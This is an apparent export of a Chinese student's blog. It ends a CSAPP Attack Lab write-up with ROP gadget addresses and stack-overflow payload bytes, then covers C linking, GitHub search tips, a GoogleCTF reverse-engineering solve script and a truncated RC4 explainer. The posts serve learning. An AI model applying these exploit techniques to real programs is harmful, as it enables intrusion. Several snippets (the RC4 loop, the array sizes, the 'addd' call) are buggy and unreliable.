<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825221643.png"></p>
<p>脑子抽了一直用上一个题目测试答案显示失败。。。</p>
<h4 id="Level5："><a href="#Level5：" class="headerlink" title="Level5："></a>Level5：</h4><p>使用ROP完成level3。这是shellcode实现的操作：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">db <span class="string">&quot;59b997fa&quot;</span><span class="punctuation">,</span><span class="number">0</span></span><br><span class="line">mov <span class="variable">%sval_address</span> <span class="punctuation">,</span><span class="variable">%rdi</span></span><br><span class="line">push <span class="variable">%touch3_address</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>

<p>首先将字符串“35 39 62 39 39 37 66 61 0a 00”入栈，然后将其首地址pop到一个寄存器，然后复制到%edi，然后调用touch3，要考虑到hexmatch和strcmp对栈的影响。由于栈随机化的原因，我们不能直接获得字符串的地址，但是可以通过<code>movl %esp,xxx</code>指令得到当前的栈顶地址，计算出字符串的地址。<strong>movl以寄存器作为目的时会把高四个字节设置为0.</strong></p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826014517.png"></p>
<p>只有一个选择 <code>48 89 e0</code> 即 <code>mov %rsp,%rax</code>  (或许89 e0),栈顶地址被放入%eax中,地址0x401a07。。。思考了良久之后，我发现无解了，因为仅靠寄存器之间的mov指令和pop指令不可能增加某个寄存器的值，所以我们放入%eax中的值不能发生变化，这显然不可能。</p>
<p>看了提示之后才恍然大悟，题目并没有局限在mov，movl，popq指令之间，在提供的rop指令中存在大量的lea指令，之前学习过lea指令，加载有效地址，同时它可以进行四则混合运算，在这里我们需要他的<strong>加</strong>运算。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826024848.png"></p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826025317.png"></p>
<p>检索了全部lea相关的指令，发现只有一个能够使用（其他都是lea    -0x6fa78caf(%rdi),%eax格式，即将%rdi加上一个立即数赋值给%eax）。<code>lea （%rdi,%rsi,1）,%rax</code>的作用是rax&#x3D;rdi+rsi*1，有了这条指令的帮助我们就可以变更栈中存放的地址。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826034218.png"></p>
<p>只要按照这个思路，计算出X的值即可，实际操作过程中发现没有<code>pop %rsi</code>以及许多相关指令，最终只能用 <code>pop %rax ; mov eax,edx ; mov edx,ecx; mov ecx,esi </code>这四条指令来代替。</p>
<p><code>pop %rax;ret</code>地址：0x4019ab</p>
<p><code>mov eax,edx;ret</code>地址：0x401a42</p>
<p><code>mov edx，ecx；ret</code>地址：0x401a69</p>
<p><code>mov ecx,esi;ret</code>地址：0x401a13</p>
<p><code>mov rsp,rax</code>地址：0x401aad</p>
<p><code>mov rax,rdi</code>地址：0x4019a2</p>
<p><code>lea    (%rdi,%rsi,1),%rax</code>地址：0x4019d6</p>
<p><code>mov rax,rdi</code>地址：0x4019a2</p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826133126.png"></p>
<p>通过计算，执行mov rsp，rdi的时候rsp的值是48，cookie相对它32个字节即0x20</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">20 00 00 00 00 00 00 00</span><br><span class="line">42 1a 40 00 00 00 00 00</span><br><span class="line">69 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826133108.png"></p>
<p>over，学到了很多^_^</p>
]]></content>
      <tags>
        <tag>csapp</tag>
        <tag>lab</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言-链接与编译</title>
    <url>/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/</url>
    <content><![CDATA[<p><strong>编译</strong> </p>
<p>源文件生成目标文件的过程及main.c–main.o</p>
<span id="more"></span>

<p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818011918.png"></p>
<p><strong>链接</strong></p>
<p>目标文件生成可执行文件的过程及main.o–main。详细点说链接是将编译之后的所有目标文件连同用到的一些静态库、运行时库组件而拼装成一个可执行文件的过程。其中有地址修复的过程，如上图所示call后面的地址暂时被设置为0，修复时就是链接器根据目标文件或者静态库中的重定位表找到那些需要被重定位的函数和全局变量从而修正他们的地址。</p>
<p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818011750.png"></p>
<p>对于add.h 、add.c、main.c三个文件</p>
<p>add.h</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br></pre></td></tr></table></figure>

<p>add.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;add.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> b=<span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a+b=%d\n&quot;</span>,addd(a,b));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译器是完全不知道printf和add函数的存在的（位于哪个区块、函数的定义），因此编译器只能将两个函数的跳转先暂时设置为0.使用odjdump对目标文件进行反汇编</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -s -d main.o &gt; main.o.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818013635.png"></p>
<p>这里的0会在后面链接的时候被修正</p>
<p>查看目标文件的重定位信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -r main.o</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818014305.png"></p>
<p>函数add、printf的偏移量分别为25、3b。</p>
<p>一直手工编译显然效率不高，学习了一点makefile的知识</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim makefile</span><br></pre></td></tr></table></figure>

<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">all:main</span><br><span class="line">main:main.o add.o</span><br><span class="line">        gcc main.o add.o -o main</span><br><span class="line">main.o:main.c</span><br><span class="line">        gcc -c main.c</span><br><span class="line">add.o:add.c</span><br><span class="line">        gcc -c add.c</span><br><span class="line">clean:</span><br><span class="line">        rm main main.o add.o</span><br></pre></td></tr></table></figure>

<p>然后make main即可，他会自动根据依赖树递归地去构建可执行文件main</p>
<p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818020241.png"></p>
<p>参考：<a href="https://www.youtube.com/watch?v=1IIUvVrCSF0">https://www.youtube.com/watch?v=1IIUvVrCSF0</a></p>
]]></content>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>GitHub高效搜索开源项目指南</title>
    <url>/2023/10/10/GitHub%E9%AB%98%E6%95%88%E6%90%9C%E7%B4%A2%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<p>互联网这么多年，我花了这么多钱，养肥了这么多人，不就留着今天用的吗！</p>
<span id="more"></span>

<p>现在我们学习路上特别是自学路上，学习资源少已经不成立了，随便一个关键词都能检索出来成千上万的资源，我们被大量的信息包围，但是质量却良莠不齐，快速寻找优质的学习资源是个很吸引人的能力。</p>
<p>比如我现在想学爬虫，我去github上直接搜索<code>爬虫</code></p>
<p><img src="/2023/10/10/GitHub%E9%AB%98%E6%95%88%E6%90%9C%E7%B4%A2%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E6%8C%87%E5%8D%97/QQ%E6%88%AA%E5%9B%BE20231009235337.png"></p>
<p>27.4k 的资源，这么多，有些还不是强相关的点进去纯属浪费时间，现在我们直接 加一个条件 stars:&gt;1000</p>
<p><img src="/2023/10/10/GitHub%E9%AB%98%E6%95%88%E6%90%9C%E7%B4%A2%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E6%8C%87%E5%8D%97/QQ%E6%88%AA%E5%9B%BE20231010000248.png"></p>
<p>在GitHub中star和fork数量大致上可以做为一个衡量优劣的标准,直接锐减到75，继续限制，可以指定语言，比如我想学的是python爬虫<code>language:python</code></p>
<p><img src="/2023/10/10/GitHub%E9%AB%98%E6%95%88%E6%90%9C%E7%B4%A2%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E6%8C%87%E5%8D%97/QQ%E6%88%AA%E5%9B%BE20231010000449.png"></p>
<p>可以说筛选出来的这40个都是优质且符合要求的内容。计算机方面的知识更新迭代的很快，有些内容可能是优质的，但是可能现实中已经很少用到了，我们可以通过限制更新时间来判断这个项目是否还活跃 <code>pushed:&gt;2023-1-1</code> <img src="/2023/10/10/GitHub%E9%AB%98%E6%95%88%E6%90%9C%E7%B4%A2%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E6%8C%87%E5%8D%97/QQ%E6%88%AA%E5%9B%BE20231010000943.png"></p>
<p>这一套组合拳下来，想要的几乎都来了。</p>
<h3 id="技巧总结："><a href="#技巧总结：" class="headerlink" title="技巧总结："></a>技巧总结：</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">in</span>:name hhh          name中必须含有hhh</span><br><span class="line"><span class="attribute">in</span>:description good  描述中含有good</span><br><span class="line"><span class="attribute">stars</span>:&gt;<span class="number">1000</span>          star数量大于<span class="number">1000</span></span><br><span class="line"><span class="attribute">forks</span>:&gt;<span class="number">1000</span>          fork数量大于<span class="number">1000</span></span><br><span class="line"><span class="attribute">pushed</span>:&gt;<span class="number">2023</span>-<span class="number">10</span>      最近一次更新在<span class="number">2023</span>年十月份之后</span><br></pre></td></tr></table></figure>



<p>内容来自：<a href="https://www.bilibili.com/video/BV1yJ411S7Wu/?buvid=YE4BCFE22DDE7DE54D5D83F8BEB16116E5AE&is_story_h5=false&mid=W7hFHnxfmhJ9wKabf6E/og==&p=1&plat_id=116&share_from=ugc&share_medium=iphone&share_plat=ios&share_session_id=4AA097DE-4C75-4426-9780-66329FCC37F1&share_source=QQ&share_tag=s_i&timestamp=1696842516&unique_k=vn6kJkv&up_id=384068749&vd_source=edc820e8f9bd6b2ea43cb8499151dea3">如何高效地在网上找开源项目做！在职程序员实际演示一波视频教程操作_哔哩哔哩_bilibili</a></p>
<p>感谢CodeSheep大佬的热情分享</p>
]]></content>
      <tags>
        <tag>tips</tag>
      </tags>
  </entry>
  <entry>
    <title>GoogleCTF</title>
    <url>/2023/06/27/GoogleCTF/</url>
    <content><![CDATA[<h1 id="oldschool"><a href="#oldschool" class="headerlink" title="oldschool"></a>oldschool</h1><p>当时做的时候就很奇怪，为什么单步调试输入相应的用户名和密码就显示success，而直接运行程序提交相同的数据就是错误，更奇怪的是当时写的脚本能更正确解除第一组，而后面的矩阵用z3求逆都出现了问题，当时只是怀疑加了反调试修改了数据，但又不知从何处检查。。。。。。</p>
<span id="more"></span>

<p>查看交叉引用，发现第一处反调试</p>
<p><img src="/2023/06/27/GoogleCTF/QQ%E6%88%AA%E5%9B%BE20230627162148.png"></p>
<p>如果检查到正在调试该值加上7。</p>
<p><img src="/2023/06/27/GoogleCTF/QQ%E6%88%AA%E5%9B%BE20230627162100.png"></p>
<p>直接查看负责检查调试的那个函数的交叉引用，即可将所有的反调试一网打尽。<img src="/2023/06/27/GoogleCTF/QQ%E6%88%AA%E5%9B%BE20230627162706.png"></p>
<p>下一处是<img src="/2023/06/27/GoogleCTF/QQ%E6%88%AA%E5%9B%BE20230627162948.png"></p>
<p>如果检查到调试，会对选中的这个数组进行异或处理，正常情况下是异或上2，这里是异或上了4。<img src="/2023/06/27/GoogleCTF/QQ%E6%88%AA%E5%9B%BE20230627163209.png"></p>
<p>第三处在这里<img src="/2023/06/27/GoogleCTF/QQ%E6%88%AA%E5%9B%BE20230627162651.png"></p>
<p><img src="/2023/06/27/GoogleCTF/QQ%E6%88%AA%E5%9B%BE20230627164040.png"></p>
<p>找到这三处反调试，在运算之前下一个断点，ida动态调试，找的if——debug这个参数，可以看到他的值为1，我们直接将其改成0即可，后面的数据就全都是正确的了。<img src="/2023/06/27/GoogleCTF/QQ%E6%88%AA%E5%9B%BE20230627182900.png"></p>
<p><img src="/2023/06/27/GoogleCTF/QQ%E6%88%AA%E5%9B%BE20230627181844.png"></p>
<p>这个脚本和之前的脚本只有两处区别，其一是填充的matx矩阵不同，也就是v18的值，我们只要在v18之后设置断点，然后读出数据即可(v18的数据收到反调试的影响)，其二就是xor_arr这个异或矩阵，这个异或矩阵也是收到了反调试的影响。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">matx = [[<span class="number">0x12</span>, <span class="number">0x1D</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x1B</span>],</span><br><span class="line">        [<span class="number">0x8</span>, <span class="number">0x1F</span>, <span class="number">0x8</span>, <span class="number">0x17</span>, <span class="number">0x1E</span>],</span><br><span class="line">        [<span class="number">0x1D</span>, <span class="number">0x3</span>, <span class="number">0x1C</span>, <span class="number">0xA</span>, <span class="number">0x15</span>],</span><br><span class="line">        [<span class="number">0x12</span>, <span class="number">0x1D</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x1C</span>],</span><br><span class="line">        [<span class="number">0x0B</span>, <span class="number">0x1E</span>, <span class="number">0x07</span>, <span class="number">0x14</span>, <span class="number">0x07</span>],]  <span class="comment">#这里填v18，username加密后的数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">rows = <span class="number">5</span></span><br><span class="line">cols = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">arr = [[z3.BitVec(<span class="string">f&#x27;arr_<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;j&#125;</span>&#x27;</span>, <span class="number">6</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows)]</span><br><span class="line">s = Solver() </span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(5):</span></span><br><span class="line"><span class="comment">#     for j in range(5):</span></span><br><span class="line"><span class="comment">#         s.add(arr[i][j] &gt;= 0)</span></span><br><span class="line"><span class="comment">#         s.add(arr[i][j] &lt;= 0x7f)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        v28 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            v28 = ((arr[i][m]&amp;<span class="number">0xff</span>) * (matx[k][i]&amp;<span class="number">0xff</span>) + (v28&amp;<span class="number">0xff</span>)) &amp; <span class="number">0x1f</span></span><br><span class="line">        <span class="keyword">if</span> k == m:</span><br><span class="line">            s.add(v28 == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> k != m:</span><br><span class="line">            s.add(v28 == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">inv = []</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    model = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">        row = [model.evaluate(arr[i][j]).as_long() <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols)]</span><br><span class="line">        inv.append(row)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;err&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;v18的逆矩阵为:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(inv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第n列循环右移n字节</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inv)):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">4</span>:</span><br><span class="line">        inv[i][<span class="number">0</span>], inv[i][<span class="number">1</span>], inv[i][<span class="number">2</span>], inv[i][<span class="number">3</span>], inv[i][<span class="number">4</span>] = inv[i][<span class="number">1</span>], inv[i][<span class="number">2</span>], inv[i][<span class="number">3</span>], inv[i][<span class="number">4</span>], inv[i][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">3</span>:</span><br><span class="line">        inv[i][<span class="number">0</span>], inv[i][<span class="number">1</span>], inv[i][<span class="number">2</span>], inv[i][<span class="number">3</span>], inv[i][<span class="number">4</span>] = inv[i][<span class="number">2</span>], inv[i][<span class="number">3</span>], inv[i][<span class="number">4</span>], inv[i][<span class="number">0</span>], inv[i][<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">2</span>:</span><br><span class="line">        inv[i][<span class="number">0</span>], inv[i][<span class="number">1</span>], inv[i][<span class="number">2</span>], inv[i][<span class="number">3</span>], inv[i][<span class="number">4</span>] = inv[i][<span class="number">3</span>], inv[i][<span class="number">4</span>], inv[i][<span class="number">0</span>], inv[i][<span class="number">1</span>], inv[i][<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">1</span>:</span><br><span class="line">        inv[i][<span class="number">0</span>], inv[i][<span class="number">1</span>], inv[i][<span class="number">2</span>], inv[i][<span class="number">3</span>], inv[i][<span class="number">4</span>] = inv[i][<span class="number">4</span>], inv[i][<span class="number">0</span>], inv[i][<span class="number">1</span>], inv[i][<span class="number">2</span>], inv[i][<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;调换位置后的逆矩阵:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(inv)</span><br><span class="line"></span><br><span class="line">xor_arr = [[<span class="number">0x1B</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x08</span>],</span><br><span class="line">           [<span class="number">0x18</span>, <span class="number">0x0F</span>, <span class="number">0x1C</span>, <span class="number">0x06</span>, <span class="number">0x07</span>],</span><br><span class="line">           [<span class="number">0x12</span>, <span class="number">0x05</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x04</span>],</span><br><span class="line">           [<span class="number">0x1D</span>, <span class="number">0x1F</span>, <span class="number">0x09</span>, <span class="number">0x13</span>, <span class="number">0x01</span>],</span><br><span class="line">           [<span class="number">0x1E</span>, <span class="number">0x11</span>, <span class="number">0x0B</span>, <span class="number">0x16</span>, <span class="number">0x19</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        inv[k][m] ^= xor_arr[k][m]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;异或后的矩阵:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(inv)</span><br><span class="line"></span><br><span class="line">index_arr = [<span class="number">0x00000010</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000011</span>, <span class="number">0x00000015</span>, <span class="number">0x0000001E</span>, <span class="number">0x00000007</span>, <span class="number">0x00000018</span>, <span class="number">0x00000012</span>, <span class="number">0x0000001C</span>, <span class="number">0x0000001A</span>, <span class="number">0x00000001</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000006</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000019</span>, <span class="number">0x00000000</span>, <span class="number">0x00000017</span>, <span class="number">0x00000014</span>, <span class="number">0x00000016</span>, <span class="number">0x00000008</span>, <span class="number">0x0000001B</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x00000013</span>, <span class="number">0x00000005</span>, <span class="number">0x00000009</span>, <span class="number">0x0000000A</span>, <span class="number">0x0000001D</span>, <span class="number">0x0000000F</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        inv[k][m] = index_arr.index(inv[k][m])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;索引:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(inv)</span><br><span class="line"></span><br><span class="line">chr_arr = [<span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x4A</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0x5A</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(chr_arr[inv[i][j]]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>总结：下次遇到这种题目，如果很相信自己的逻辑和脚本，一直不对的话就去查看一下有无反调试。</p>
]]></content>
  </entry>
  <entry>
    <title>RC4</title>
    <url>/2023/08/20/RC4/</url>
    <content><![CDATA[<p>题目中也遇到过很多次RC4了，一般是都是从加密函数的名字看出，现在学习一下，了解其特征，更方便识别出。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>RC4是<strong>对称密码</strong>算法中的<strong>流密码</strong>加密算法，对称及加解密的密钥相同，流密码意思是加密是逐字节进行的与之对应的就是<strong>块加密</strong>。</p>
<span id="more"></span>

<h2 id="算法原理"><a href="#算法原理" class="headerlink" title="算法原理"></a>算法原理</h2><p>RC4生成一种称为密钥流的伪随机流（S表），他与明文通过异或操作混合，以达到加密的目的，解密时与明文进行异或操作。其密钥流由两部分组成，分别是KSA和PRGA。可以简单的理解为RC4由这两部分组成。</p>
<p><strong>KSA</strong> 部分的代码。密钥的长度一般为5<del>16字节及40</del>128位，通常不超过256位。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    S[i]=i;       <span class="comment">//用0~255初始化S数组</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    j=(j+S[i]+key[i % keylength]) % <span class="number">256</span>;  <span class="comment">//使用密钥进行替换</span></span><br><span class="line">    Swap(S[i],S[j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>PRGA</strong> 根据待加密的data进行置换，得到的子密码k与data进行异或即可得到密文</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">i,j,t=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(m=<span class="number">0</span>;j&lt;datalength;m++)</span><br><span class="line">&#123;</span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">    j=(j+S[i])%<span class="number">256</span>;</span><br><span class="line">    Swap(S[i],S[j]);</span><br><span class="line">    t=(S[i]+S[j])%<span class="number">256</span>;</span><br><span class="line">    k=S[t];</span><br><span class="line">    data[m]^=k;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>合并起来的代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Swap</span><span class="params">(<span class="type">int</span>*a,<span class="type">int</span>*b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> t=<span class="number">0</span>;</span><br><span class="line">    t=*a;</span><br><span class="line">    *a=*b;</span><br><span class="line">    *b=t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> key[]=<span class="string">&quot;fishjump&quot;</span>;</span><br><span class="line">    <span class="type">int</span> keylength=<span class="built_in">strlen</span>(key);</span><br><span class="line">    <span class="type">int</span> S[<span class="number">255</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    S[i]=i;       <span class="comment">//用0~255初始化S数组</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      j=((j+S[i]+key[i % keylength]) % <span class="number">256</span>);  <span class="comment">//使用密钥进行替换</span></span><br><span class="line">      Swap(&amp;S[i],&amp;S[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    j=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> t=<span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> data[]=<span class="string">&quot;mzyloveyy&quot;</span>;</span><br><span class="line">    <span class="type">int</span> datalength=<span class="built_in">strlen</span>(data);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> m=<span class="number">0</span>;m&lt;datalength;m++)</span><br><span class="line">  &#123; </span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">    j=(j+S[i])%<span 